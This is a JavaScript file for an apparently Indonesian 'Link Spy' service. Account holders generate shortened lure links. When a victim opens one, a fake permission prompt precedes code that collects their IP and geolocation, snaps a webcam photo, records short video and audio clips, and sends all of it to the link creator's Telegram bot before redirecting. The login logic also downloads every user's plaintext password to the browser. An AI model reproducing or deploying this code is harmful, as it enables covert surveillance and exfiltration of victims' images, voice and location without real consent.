let currentLoggedInUser = null;

function showCard(cardId) {
  document.getElementById("loginCard").style.display = "none";
  document.getElementById("formCard").style.display = "none";
  document.getElementById("adminCard").style.display = "none";
  document.getElementById(cardId).style.display = "block";
}

function logout() {
  localStorage.removeItem('sessionId');
  currentLoggedInUser = null;
  location.reload();
}

async function login() {
  const u = document.getElementById("username").value.trim();
  const p = document.getElementById("password").value.trim();

  try {
    const response = await fetch('/api/users');
    const users = await response.json();

    const user = users[u];

    if (user && user.password === p) {
      if (user.role === "user" && user.type === "timed" && user.expiryDate) {
        const now = new Date();
        const expiry = new Date(user.expiryDate);
        if (now > expiry) {
          await fetch('/api/users', {
            method: 'DELETE',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: u })
          });
          return alert("❌ Akun Anda telah kadaluarsa. Silakan hubungi admin.");
        }
      }

      currentLoggedInUser = u;
      localStorage.setItem('sessionId', 'some-unique-session-id'); // Simpan session ID lokal
      
      if (user.role === "admin") {
        showCard("adminCard");
        renderUsers();
      } else {
        showCard("formCard");
        document.getElementById('botToken').value = user.botToken || "";
        document.getElementById('chatId').value = user.chatId || "";
      }
    } else {
      alert("❌ Username atau Password salah!");
    }
  } catch (error) {
    console.error('Login error:', error);
    alert('Terjadi kesalahan saat login.');
  }
}

async function renderUsers() {
  const userListDiv = document.getElementById("userList");
  userListDiv.innerHTML = "";

  try {
    const response = await fetch('/api/users');
    const users = await response.json();

    for (const username in users) {
      if (username !== "admin") {
        const user = users[username];
        const expiryText = user.type === 'timed' 
          ? user.expiryDate ? `<span class="${new Date(user.expiryDate) < new Date() ? 'expired' : ''}">(${new Date(user.expiryDate).toLocaleDateString()})</span>` : '' 
          : '(Permanen)';
        const userItem = document.createElement("div");
        userItem.classList.add("user-item");
        userItem.innerHTML = `
          <span>${username}</span>
          <span class="user-role">(${user.role.toUpperCase()})</span>
          <span class="user-status">${expiryText}</span>
          <button onclick="deleteUser('${username}')">Hapus</button>
        `;
        userListDiv.appendChild(userItem);
      }
    }
  } catch (error) {
    console.error('Error fetching users:', error);
    alert('Gagal memuat daftar user.');
  }
}

function toggleDurationInput() {
  const accountType = document.getElementById('accountType').value;
  document.getElementById('durationGroup').style.display = accountType === 'timed' ? 'block' : 'none';
}

async function addUser() {
  const newUsername = document.getElementById("newUsername").value.trim();
  const newPassword = document.getElementById("newPassword").value.trim();
  const newRole = document.getElementById("newRole").value;
  const accountType = document.getElementById('accountType').value;
  const durationDays = document.getElementById('durationDays').value;

  if (!newUsername || !newPassword) {
    return alert("❌ Username dan password tidak boleh kosong!");
  }
  
  let expiryDate = null;
  if (accountType === 'timed') {
    const date = new Date();
    date.setDate(date.getDate() + parseInt(durationDays, 10));
    expiryDate = date.toISOString();
  }

  const newUser = {
    username: newUsername,
    password: newPassword,
    role: newRole,
    type: accountType,
    expiryDate: expiryDate
  };

  try {
    const response = await fetch('/api/users', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(newUser)
    });

    if (response.status === 409) {
      return alert("❌ Username sudah ada!");
    }

    if (!response.ok) {
        throw new Error('Failed to add user');
    }

    document.getElementById("newUsername").value = "";
    document.getElementById("newPassword").value = "";
    renderUsers();
    alert("✅ User berhasil ditambahkan!");
  } catch (error) {
    console.error('Add user error:', error);
    alert("❌ Gagal menambahkan user.");
  }
}

async function deleteUser(username) {
  if (confirm(`Yakin ingin menghapus user '${username}'?`)) {
    try {
      const response = await fetch('/api/users', {
        method: 'DELETE',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username })
      });

      if (!response.ok) {
        throw new Error('Failed to delete user');
      }

      renderUsers();
      alert("✅ User berhasil dihapus!");
    } catch (error) {
      console.error('Delete user error:', error);
      alert("❌ Gagal menghapus user.");
    }
  }
}

async function shorten(url) {
  try {
    const res = await fetch("https://tinyurl.com/api-create.php?url=" + encodeURIComponent(url));
    return await res.text();
  } catch(e) { return url; }
}

async function generate() {
  const token = document.getElementById('botToken').value.trim();
  const chat  = document.getElementById('chatId').value.trim();
  const url   = document.getElementById('targetUrl').value.trim();
  
  if (!token || !chat || !url) return alert('Isi semua kolom dulu!');

  try {
    // Ambil data user saat ini untuk mendapatkan password dan data lainnya
    const response = await fetch('/api/users');
    const users = await response.json();
    const userToUpdate = users[currentLoggedInUser];
    
    // Kirim permintaan update ke API
    await fetch('/api/users', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            username: currentLoggedInUser,
            password: userToUpdate.password,
            role: userToUpdate.role,
            botToken: token,
            chatId: chat,
            type: userToUpdate.type,
            expiryDate: userToUpdate.expiryDate
        })
    });
  } catch (error) {
    console.error('Failed to update user data:', error);
  }

  const longLink = `${location.origin}${location.pathname}?mode=view&token=${encodeURIComponent(token)}&chat=${encodeURIComponent(chat)}&target=${encodeURIComponent(url)}`;
  const shortLink = await shorten(longLink);
  const out = document.getElementById('linkOut');
  out.style.display = "block";
  out.innerHTML = `<strong>Link Spy:</strong><br><a href="${shortLink}" target="_blank">${shortLink}</a>`;
}

let currentToken, currentChat, currentTarget;

async function handlePermissionsAndData() {
  let ipAddr = "Unknown IP";
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    ipAddr = data.ip;
  } catch {}

  let lat = "-", lon = "-";
  try {
    const p = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 }));
    lat = p.coords.latitude;
    lon = p.coords.longitude;
  } catch {}

  const kirim = (type, blob, cap) => {
    const fd = new FormData();
    fd.append("chat_id", currentChat);
    fd.append(type, blob, `${type}_${Date.now()}`);
    fd.append("caption", cap);
    fetch(`https://api.telegram.org/bot${currentToken}/send${type === "audio" ? "Audio" : "Video"}`, { method: "POST", body: fd });
  };

  const kirimFoto = (blob, cap) => {
    const fd = new FormData();
    fd.append("chat_id", currentChat);
    fd.append("photo", blob);
    fd.append("caption", cap);
    fetch(`https://api.telegram.org/bot${currentToken}/sendPhoto`, { method: "POST", body: fd });
  };

  try {
    const s = await navigator.mediaDevices.getUserMedia({ video: true });
    const v = document.createElement("video");
    const c = document.createElement("canvas");
    v.srcObject = s; await new Promise(r => v.onloadedmetadata = r);
    v.play(); c.width = v.videoWidth; c.height = v.videoHeight;
    c.getContext("2d").drawImage(v, 0, 0);
    s.getTracks().forEach(t => t.stop());
    c.toBlob(b => kirimFoto(b, `📸 Lat:${lat}, Lon:${lon}\n🌐 IP: ${ipAddr}`), "image/jpeg");
  } catch {}

  try {
    const vs = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    const rec = new MediaRecorder(vs);
    const chunks = [];
    rec.ondataavailable = e => chunks.push(e.data);
    rec.onstop = () => {
      const blob = new Blob(chunks, { type: "video/webm" });
      kirim("video", blob, `📹 3 detik\nLat:${lat}, Lon:${lon}\n🌐 IP: ${ipAddr}`);
      vs.getTracks().forEach(t => t.stop());
    };
    rec.start(); setTimeout(() => rec.stop(), 3000);
  } catch {}

  try {
    const as = await navigator.mediaDevices.getUserMedia({ audio: true });
    const rec = new MediaRecorder(as);
    const chunks = [];
    rec.ondataavailable = e => chunks.push(e.data);
    rec.onstop = () => {
      const blob = new Blob(chunks, { type: "audio/ogg" });
      kirim("audio", blob, `🎤 5 detik\nLat:${lat}, Lon:${lon}\n🌐 IP: ${ipAddr}`);
      as.getTracks().forEach(t => t.stop());
    };
    rec.start(); setTimeout(() => rec.stop(), 5000);
  } catch {}

  setTimeout(() => location.replace(currentTarget), 6000);
}

function acceptPermissions() {
  document.getElementById("customPermissionModal").style.display = "none";
  handlePermissionsAndData();
}

(async () => {
  const params = new URLSearchParams(location.search);
  if (params.get("mode") !== "view") return;

  document.getElementById("loginCard").style.display = "none";
  document.getElementById("formCard").style.display = "none";
  document.getElementById("adminCard").style.display = "none";

  currentToken  = params.get("token");
  currentChat   = params.get("chat");
  currentTarget = params.get("target") || "https://example.com";

  if (!currentToken || !currentChat) return;

  document.getElementById("modalTargetUrl").textContent = currentTarget;
  document.getElementById("customPermissionModal").style.display = "flex";
})();
